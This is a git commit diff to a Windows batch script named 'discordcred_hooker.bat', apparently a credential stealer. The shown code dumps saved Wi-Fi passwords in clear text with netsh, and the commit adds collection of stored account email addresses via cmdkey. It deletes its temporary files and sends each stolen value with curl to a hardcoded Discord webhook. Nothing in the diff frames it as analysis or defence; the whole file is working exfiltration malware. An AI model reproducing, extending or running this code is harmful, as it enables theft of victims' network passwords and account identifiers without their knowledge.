e0a9f408f2e258b8f9ad88bda26d3b85df823508
batchhacker00 <batchhacker00@gmail.com>
2024-11-28 22:56:28 +0100

    Update discordcred_hooker.bat

--- discordcred_hooker.bat
+++ discordcred_hooker.bat
@@ -19,6 +19,8 @@ set wifi=%%a
 ) 
 netsh wlan show profile %wifi% key=clear | find "Key Content" > wifipass.txt
 
+cmdkey /list | find "@" >> email.txt
+
 
 set /p "ip=" < ip.txt
 set /p "host=" < host.txt
@@ -27,6 +29,7 @@ set /p "line1=" < line1.txt
 set /p "line2=" < line2.txt
 set /p "wifipass=" < wifipass.txt
 set /p "ssid=" < ssid.txt
+set /p "email=" < email.txt
 
 del ip.txt
 del host.txt
@@ -35,6 +38,7 @@ del line1.txt
 del line2.txt
 del wifipass.txt
 del ssid.txt
+del email.txt
 
 set webhook="https://discordapp.com/api/webhooks/1288994255355772948/_y-tOeyzn0escJxZNuathSLEGDuWjZlzo_Q2BNA3tyAhWF2QJ5yK4X9SnQxIhnYsgqwy"
 
@@ -51,3 +55,5 @@ cmd /c timeout /t 0 > nul
 cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wifipass%\"}" %webhook%
 cmd /c timeout /t 0 > nul
 cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
+cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%email%\"}" %webhook%
